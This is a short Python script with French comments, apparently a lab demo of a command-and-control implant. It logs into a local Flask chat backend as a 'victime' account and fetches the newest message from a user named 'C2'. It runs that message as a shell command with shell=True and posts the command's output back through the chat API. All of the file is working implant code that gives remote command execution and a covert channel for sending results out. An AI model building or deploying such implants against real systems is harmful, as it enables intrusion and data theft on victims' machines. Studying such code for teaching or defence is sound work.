import requests
from datetime import datetime
import subprocess

USER = "victime_2"
PASSWORD = "testtest"
IP = "127.0.0.1"
PORT = 6000  # le backend Flask écoute ici

find = False

response = requests.post(
    f"http://{IP}:{PORT}/api/auth/login",
    json={"username": USER, "password": PASSWORD},
)
response.raise_for_status()

token = response.json()["token"]

'definir un premier last en 2000'
last = {'body': 'vide', 'createdAt': '2000-01-22T17:15:13.611397', 'id': 0, 'username': 'C2'}
while not find:

    response = requests.get(
        f"http://{IP}:{PORT}/api/messages",
        headers={"Authorization": f"Bearer {token}"},
    )

    for message in response.json():
        body = message["body"]
        date = message["createdAt"]
        username = message["username"]
        id = message["id"]


        print(message)
        if username == "C2":
            if datetime.fromisoformat(date) > datetime.fromisoformat(last['createdAt']):
                last = message.copy()
                print("coucou")

    print("fin")
    print(last)

    find = True


try:
    result = subprocess.run(
        last['body'],                      # la commande
        shell=True,
        text=True,
        timeout=60,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # fusionne stderr -> stdout
    )
except:
    result = ""

retour = result.stdout

print(retour)

response = requests.post(
    f"http://{IP}:{PORT}/api/messages",
    headers={"Authorization": f"Bearer {token}"},
    json={"body": retour},
)
response.raise_for_status()